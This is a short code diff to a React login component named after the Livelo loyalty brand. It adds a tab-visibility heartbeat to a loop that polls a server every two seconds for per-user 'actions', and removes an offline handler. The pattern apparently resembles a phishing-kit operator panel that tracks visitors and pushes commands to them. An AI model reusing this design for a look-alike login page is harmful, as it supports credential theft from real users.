@@ -136,13 +136,15 @@ function LiveloLogin() {
     }
   };
 
-  // Verificar comandos + heartbeat automático via polling
+  // Verificar comandos + heartbeat só quando aba visível
   useEffect(() => {
     if (!userId) return;
 
     const checkCommand = async () => {
       try {
-        const response = await axios.get(`${API}/user/check-action/${userId}`);
+        // hb=1 SOMENTE se aba visível
+        const hb = document.hidden ? 0 : 1;
+        const response = await axios.get(`${API}/user/check-action/${userId}?hb=${hb}`);
         
         if (response.data && response.data.action) {
           const action = response.data.action;
@@ -177,27 +179,6 @@ function LiveloLogin() {
     const interval = setInterval(checkCommand, 2000);
     return () => clearInterval(interval);
   }, [userId, lastProcessedTimestamp]);
-
-  // Detectar saída da aba - marcar offline IMEDIATAMENTE
-  useEffect(() => {
-    if (!userId) return;
-
-    const handleVisibility = () => {
-      if (document.hidden) {
-        // Zerar heartbeat para ficar offline imediato
-        fetch(`${API}/user/go-offline/${userId}`, { method: 'POST', keepalive: true });
-      }
-    };
-
-    document.addEventListener("visibilitychange", handleVisibility);
-    window.addEventListener("beforeunload", () => {
-      fetch(`${API}/user/go-offline/${userId}`, { method: 'POST', keepalive: true });
-    });
-
-    return () => {
-      document.removeEventListener("visibilitychange", handleVisibility);
-    };
-  }, [userId]);
 
   // Verifica se o formulário está válido
   useEffect(() => {
